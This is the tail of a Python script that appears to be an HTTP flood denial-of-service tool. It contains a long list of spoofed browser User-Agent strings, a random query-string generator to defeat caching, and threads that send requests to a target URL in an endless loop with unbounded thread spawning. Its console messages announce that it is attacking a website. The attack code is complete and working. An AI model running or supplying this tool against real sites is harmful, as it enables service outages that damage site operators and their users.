        headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36")
        headers.append("Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36")
        headers.append("Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36")
        headers.append("Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36")
        headers.append("Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36")
        headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0")
        headers.append("Mozilla/5.0 (Android 9; Mobile; rv:67.0.3) Gecko/67.0.3 Firefox/67.0.3")
        headers.append("Mozilla/5.0 (Android 7.1.1; Tablet; rv:67.0) Gecko/67.0 Firefox/67.0")
        headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.27 Safari/537.36 OPR/62.0.3331.10 (Edition beta)")
        headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27")
        headers.append("Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1")
        headers.append("Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1")
        headers.append("Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
        headers.append("Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0")
        headers.append("Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1")
        headers.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2")
        headers.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0")
        headers.append("Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0")
        headers.append("Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
        headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2")
        headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
        headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3")
        headers.append("Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0")
        headers.append("Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)")
        headers.append("Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14")
        headers.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20")
        headers.append("Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a")
        headers.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2")
        headers.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0")
        headers.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34")
        headers.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1")
        headers.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2")
        headers.append("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
        headers.append("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0")
        headers.append("Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0")
        headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24")
        headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1")
        headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0")
        headers.append("Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1")
        headers.append("Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0")
        headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8")
        headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0")
        headers.append("Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15")
        headers.append("Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko")
        headers.append("Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16")
        headers.append("Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025")
        headers.append("Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1")
        headers.append("Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020")
        headers.append("Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1")
        headers.append("Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8")
        headers.append("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7")
        headers.append("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5")
        headers.append("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330")
        headers.append("Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)")
        headers.append("Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0")
        headers.append("Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15")
        headers.append("Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0")
        headers.append("Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3")
        headers.append("Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5")
        headers.append("Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8")
        headers.append("Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3")
        headers.append("Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7")
        headers.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0")
        headers.append("Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
        headers.append("Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN")
        headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
        headers.append("Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
        headers.append("Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN")
        headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN")
        headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN")
        headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN")
        headers.append("Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print ("{0} Website Error ! ".format(count))
            except requests.exceptions.ConnectionError:
                print ("[TuanCE Are Attack Website....]")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
